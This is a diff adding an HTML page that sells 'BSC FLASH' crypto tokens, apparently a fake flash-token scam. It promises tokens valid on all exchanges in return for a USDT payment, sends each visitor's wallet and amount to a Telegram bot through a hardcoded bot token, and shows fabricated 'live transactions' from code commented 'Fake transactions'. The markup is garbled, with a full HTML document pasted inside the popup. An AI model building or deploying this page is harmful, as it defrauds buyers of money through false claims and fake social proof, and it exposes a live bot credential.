@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>BSC FLASH 6.71</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      color: #FFD700;
+      user-select: none;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 20px;
+      display: none;
+    }
+
+    .glass-box {
+      background: rgba(0, 0, 0, 0.65);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.6);
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      text-align: center;
+    }
+
+    .header img {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+    }
+
+    .header h2 {
+      font-size: 32px;
+      font-weight: bold;
+      text-shadow: 0 0 6px #FFD70088;
+    }
+
+    input,
+    .result,
+    .btn-next {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #fff;
+      font-size: 15px;
+      font-weight: bold;
+      border: 1px solid #FFD70044;
+      box-shadow: 0 0 6px #00000088 inset;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+    }
+
+    .result {
+      text-align: center;
+    }
+
+    .btn-next {
+      background: linear-gradient(to right, #FFD700, #e6c300);
+      color: #000;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .btn-next:hover {
+      background: #FFD700;
+    }
+
+    .network-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    .network-btn {
+      background: rgba(255,255,255,0.05);
+      border: 2px solid #FFD70044;
+      border-radius: 10px;
+      padding: 3px;
+      width: 30%;
+      transition: 0.3s;
+    }
+
+    .network-btn img {
+      width: 100%;
+      height: 24px;
+      object-fit: contain;
+      border-radius: 6px;
+    }
+
+    .network-btn.active {
+      border-color: #FFD700;
+      box-shadow: 0 0 8px #FFD700;
+    }
+
+    #tx-box {
+      height: 40px;
+      background: rgba(0,0,0,0.5);
+      border-radius: 10px;
+      padding: 10px;
+      border: 1px solid #FFD700;
+      font-size: 14px;
+      text-align: left;
+      overflow: hidden;
+    }
+
+    .support-button {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 60px;
+      height: 60px;
+      z-index: 9999;
+      border-radius: 50%;
+      overflow: hidden;
+      box-shadow: 0 0 10px #FFD700;
+      transition: transform 0.2s ease;
+      display: none;
+    }
+
+    .support-button:hover {
+      transform: scale(1.1);
+    }
+
+    .support-button img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 50%;
+    }
+
+    #popup-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .popup-box {
+      background: rgba(0, 0, 0, 0.65);
+      border: 1px solid #FFD70088;
+      border-radius: 20px;
+      box-shadow: 0 0 20px #FFD70055;
+      max-width: 90%;
+      width: 400px;
+      padding: 25px;
+      color: #FFD700;
+      text-align: center;
+    }
+
+    .popup-box h2 {
+      margin-bottom: 20px;
+      font-size: 22px;
+    }
+
+    .popup-box p {
+      margin-bottom: 30px;
+      line-height: 1.7;
+      font-size: 15px;
+    }
+
+    .popup-box button {
+      background: #FFD700;
+      color: black;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+
+    .popup-box button:hover {
+      background: #e6c100;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false">
+
+  <!-- Popup -->
+  <div id="popup-overlay">
+    <div class="popup-box">
+      <h2>📢 Important Notice</h2>
+      <p>
+      <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Flash Announcement</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #111;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+
+    h2 {
+      color: #007bff;
+    }
+
+    ul, ol {
+      margin: 0 0 15px 0;
+      padding-left: 20px;
+    }
+
+    ul li::marker {
+      color: green;
+    }
+
+    ol li::marker {
+      color: #007bff;
+    }
+
+    .section {
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+ ⚡️ FLASH Available Now!
+
+🔹 Flash Features:
+
+Tradable and Can be sent and received freely it also Convertible to other cryptocurrencies
+
+Accepted by all wallets and platforms: Binance, Bybit, Trust Wallet, MetaMask...
+
+Valid for 180 days
+
+
+
+---
+
+🛠 How to Use the Bot:
+
+1. Enter your wallet address (network will be detected automatically)
+
+
+2. Choose the amount you want to pay (between $20 and $500)
+
+
+3. You’ll see the amount of FLASH you will receive
+
+
+4. Click Continue
+
+
+5. Copy the wallet address and send the required payment
+
+
+6. After payment, send us a screenshot
+
+
+7. Your FLASH tokens will be delivered automatically  </p>
+      <button onclick="closePopup()">OK</button>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="container">
+    <div class="glass-box header">
+      <h2>BSC-X 6.71</h2>
+      <img src="logo.png" alt="logo" />
+    </div>
+
+    <div class="glass-box">
+      <input type="text" id="wallet" placeholder="Enter wallet address" oninput="detectNetwork()" />
+
+      <div class="network-buttons">
+        <div id="bep" class="network-btn"><img src="bep.png" alt="BEP20" /></div>
+        <div id="trx" class="network-btn"><img src="trx.png" alt="TRON" /></div>
+        <div id="erc" class="network-btn"><img src="erc.png" alt="ERC20" /></div>
+      </div>
+
+      <input type="number" id="amount" placeholder="Enter amount (20 - 200 USDT)" oninput="calculateFlash()" />
+      <div class="result" id="flashValue">QUANTITY: 0 BSC FLASH</div>
+      <button class="btn-next" onclick="submitForm()">NEXT</button>
+    </div>
+
+    <div class="glass-box">
+      <h3 style="color:#FFD700; margin:0;">📊 Live Transactions</h3>
+      <div id="tx-box"></div>
+    </div>
+  </div>
+
+  <!-- Floating Support Button -->
+  <a href="https://t.me/Sigmateam6" target="_blank" class="support-button" title="Telegram Support">
+    <img src="pic.png" alt="Support" />
+  </a>
+
+  <script>
+    function closePopup() {
+      document.getElementById("popup-overlay").style.display = "none";
+      document.querySelector(".container").style.display = "block";
+      document.querySelector(".support-button").style.display = "flex";
+    }
+
+    function detectNetwork() {
+      const address = document.getElementById("wallet").value;
+      document.querySelectorAll(".network-btn").forEach(btn => btn.classList.remove("active"));
+      if (address.startsWith("T")) {
+        document.getElementById("trx").classList.add("active");
+      } else if (address.startsWith("0x")) {
+        document.getElementById("bep").classList.add("active");
+        document.getElementById("erc").classList.add("active");
+      }
+    }
+
+    function calculateFlash() {
+      const amount = parseFloat(document.getElementById("amount").value);
+      const flash = amount * 50;
+      document.getElementById("flashValue").innerText = isNaN(amount) ? "" : `You will get: ${flash} BSC FLASH`;
+    }
+
+    function submitForm() {
+      const wallet = document.getElementById("wallet").value;
+      const amount = parseFloat(document.getElementById("amount").value);
+      if (!wallet || isNaN(amount) || amount < 20 || amount > 200) {
+        alert("Please enter a valid wallet and amount between 20 and 200 USDT.");
+        return;
+      }
+
+      const flash = amount * 50;
+      localStorage.setItem("amount_usdt", amount);
+      localStorage.setItem("flash_bsc", flash);
+
+      const message = `🚀 BINANCE FLASH 6.71\nWallet: ${wallet}\nAmount: ${amount} USDT\nFlash: ${flash} BSC FLASH`;
+      const botToken = '7541294448:AAEbnzKns8iQnv01Q6wgTmRyNhqEBDpxCqo';
+      const chatId = '7739393558';
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+
+      window.location.href = "page1.html";
+    }
+
+    // Fake transactions
+    const networks = ["TRON", "BSC", "ERC"];
+    const txBox = document.getElementById("tx-box");
+
+    function getRandomAmount() {
+      return Math.floor(Math.random() * (47889 - 1300 + 1)) + 1300;
+    }
+
+    function getRandomAddress(network) {
+      if (network === "TRON") {
+        return "T" + Math.random().toString(36).substring(2, 10).toUpperCase();
+      } else {
+        return "0x" + Math.random().toString(16).substring(2, 12);
+      }
+    }
+
+    function createTx() {
+      const network = networks[Math.floor(Math.random() * networks.length)];
+      const address = getRandomAddress(network);
+      const amount = getRandomAmount();
+
+      const row = document.createElement("div");
+      row.innerHTML = `✅ <b style="color:#FFD700">${network}</b> address <span style="color:#ccc">${address}</span> received <b style="color:#0f0">${amount} BSC FLASH</b>`;
+      txBox.innerHTML = '';
+      txBox.appendChild(row);
+    }
+
+    setInterval(createTx, 300);
+  </script>
+</body>
+</html>
